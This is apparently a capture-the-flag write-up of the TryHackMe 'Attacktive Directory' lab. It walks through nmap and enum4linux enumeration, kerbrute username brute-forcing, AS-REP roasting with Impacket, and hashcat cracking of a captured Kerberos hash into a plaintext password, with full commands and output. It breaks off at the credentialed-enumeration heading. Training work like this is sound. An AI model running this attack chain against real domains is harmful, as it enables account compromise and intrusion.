---
title: Attacktive Directory | THM
date: 2025-09-23 07:40:00 +0200
categories:
  - THM 
tags:
  - THM
  - AD
img_path: ""
image: https://tryhackme-images.s3.amazonaws.com/room-icons/f38b047a2a7089147766099dffeb8a5d.png
---



# Intro 

99% of Corporate networks run off Active Directory. From this machine you will have a basic understanding on how to exploit such an environment.

### Learning Objectives

- AD Enumeration
- Kerberos
- Cracking Hashes
- Impacket
### [Challenge](https://tryhackme.com/room/attacktivedirectory)


### Tools

- [HashCat](https://hashcat.net/hashcat/)  
- [Impacket](https://github.com/SecureAuthCorp/impacket)  
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)  
- [Kerbrute](https://github.com/ropnop/kerbrute)  
- [SMBClient](https://tldp.org/HOWTO/SMB-HOWTO-8.html)

#  Setup

###  get Impacket:

```bash
 git clone <https://github.com/SecureAuthCorp/impacket.git> /opt/impacket
```

### install pip for Python3

```bash
sudo apt install python3-pip
```

### install prereqs

```bash
pip3 install -r /opt/impacket/requirements.txt
```

### install impacket

```bash
cd /opt/impacket && sudo python3 ./setup.py install
```

### install bloodhound and neo4j

```bash
sudo apt install bloodhound neo4j
```


# Enumeration

```bash
nmap -sV -v 10.10.98.191 -A
```


Here we go the result :

```bash 
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:  
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos 
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Which tool do we use to enumerate port 139/445 (SMB)?

A well known tool to do so is **_enum4linux_** this was also hinted at in the brief xD: .


### Find out what the NetBIOS-Domain name is of the machine

To got this we must use `enum4linux`  so the command :

```bash 
enum4linux <Machine-ip>
```

So we got big output but we focus on `NetBIOS Domain Name`  

![[Pasted image 20250923113005.png]]

### What invalid TLD do people commonly use for their Active Directory Domain?

AS we see in `namp` output we notes that Domain Name being `spookysec.local` 

```bash 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
```

So `.local` is often miss-used as a .TLD (Top Level Domain)



# Enumerating Users via Kerberos

First we will enumerate with this lists 

![[Pasted image 20250923114002.png]]


## How to enumerate valid users with `kerbrute`?

`Kerbrute` Tool has a parameter `userenum` to enumerate valid usernames, To enumerate valid usernames from the `userlist.txt` provided to us we run this  command:

```bash
kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

Here we go , we got this output :  

```bash 
[👾]   )#  kerbrute userenum --dc 10.10.24.200 -d spookysec.local usrlst -t 100                                     [/root]

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 09/23/25 - Ronnie Flathers @ropnop

2025/09/23 09:13:00 >  Using KDC(s):
2025/09/23 09:13:00 >   10.10.24.200:88

2025/09/23 09:13:01 >  [+] VALID USERNAME:       james@spookysec.local
2025/09/23 09:13:02 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/09/23 09:13:03 >  [+] VALID USERNAME:       James@spookysec.local
2025/09/23 09:13:03 >  [+] VALID USERNAME:       robin@spookysec.local
2025/09/23 09:13:07 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/09/23 09:13:11 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/09/23 09:13:23 >  [+] VALID USERNAME:       backup@spookysec.local
2025/09/23 09:13:27 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/09/23 09:13:44 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/09/23 09:13:49 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/09/23 09:14:20 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/09/23 09:15:34 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/09/23 09:15:58 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/09/23 09:17:24 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/09/23 09:17:47 >  [+] VALID USERNAME:       ori@spookysec.local
2025/09/23 09:18:31 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2025/09/23 09:20:12 >  Done! Tested 73317 usernames (16 valid) in 431.760 seconds
```

We notes this accounts : 
- `svc-admin@spookysec.local`
- `backup@spookysec.local`
- `administrator@spookysec.local`


# Abusing Kerberos

we can attempt to abuse a feature with an attack method called ASRreproasting. This occurs when a user account has the privilege “Does not require Pre-Authentication” set. So the account in question **does not** need to provide valid identification before requesting a Kerberos Ticket.

So we'll use tool called `GetNpUsers`  from `Impacket`  that we can use to query ASReproastable accounts from the Key Distribution Center.

and  it's takes valid username from `Kerbrute`  output , So we'll run the following command :

Test backup username :
```bash
GetNPUsers spookysec.local/backup -no-pass -dc-ip <ip>
```

and i got this :

```bash 
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for backup
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

lets test it with  svc-admin: 

```bash 
GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip <ip>
```

And here we go we got this great output 

```bash 
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d44a414465862a7df602ca$b01ea118a95ae0c5479689cd138f9507b0bbf00ed4e4adbd7f47521566996703a5ec2021550040d732fb682e8c5f92aa911779fefb94cccf9b33fdd5d786bc3f1debffc6a04cdb85d2c7c7b631029dec8f0fd4d17619fa11e16d1feeac79bc4c0c7c2f71dbbbb85dab0ca67db56662a60caabeca1b64ff3841788f85245aba9ff902174d58f495be0b125a808489b384c1580adafaa69718c12b0605d6f161690b29574e426afcf8b737da61218ad84835d4eb274ed3b492d7de3c171fcb7fd1f1682c2c433cbd2cb95872607bd2b863c348b18be74cb51dd7ab2576fb054a50a93e8b73b6b9e15b97631f0395458dcf6152
```

Then we got a hash back! Looking at the [HashCat examples wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes), this appears to be Kerberos 5 AS-REP etype 23, which is mode 18200. We can save this full hash to a file and then specify the mode, hash and dictionary like  this command :

```bash
hashcat -m 18200 hash.txt passwordlist.txt
```

And we got this :

```bash
[👾]   )#  hashcat -m 18200 hash passwo                                                                             [/root]
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-14650HX, 2856/5776 MB (1024 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 6 MB

Dictionary cache built:
* Filename..: passwo
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d44a414465862a7df602ca$b01ea118a95ae0c5479689cd138f9507b0bbf00ed4e4adbd7f47521566996703a5ec2021550040d732fb682e8c5f92aa911779fefb94cccf9b33fdd5d786bc3f1debffc6a04cdb85d2c7c7b631029dec8f0fd4d17619fa11e16d1feeac79bc4c0c7c2f71dbbbb85dab0ca67db56662a60caabeca1b64ff3841788f85245aba9ff902174d58f495be0b125a808489b384c1580adafaa69718c12b0605d6f161690b29574e426afcf8b737da61218ad84835d4eb274ed3b492d7de3c171fcb7fd1f1682c2c433cbd2cb95872607bd2b863c348b18be74cb51dd7ab2576fb054a50a93e8b73b6b9e15b97631f0395458dcf6152:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d...cf6152
Time.Started.....: Tue Sep 23 09:32:18 2025 (0 secs)
Time.Estimated...: Tue Sep 23 09:32:18 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwo)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   225.9 kH/s (2.29ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/70188 (17.51%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 0/70188 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: m123456 -> henrik
Hardware.Mon.#1..: Util:  4%

Started: Tue Sep 23 09:31:52 2025
Stopped: Tue Sep 23 09:32:20 2025
```

So from the `hashcat` output the password is `management2005` .


# Enumeration  – With Credentials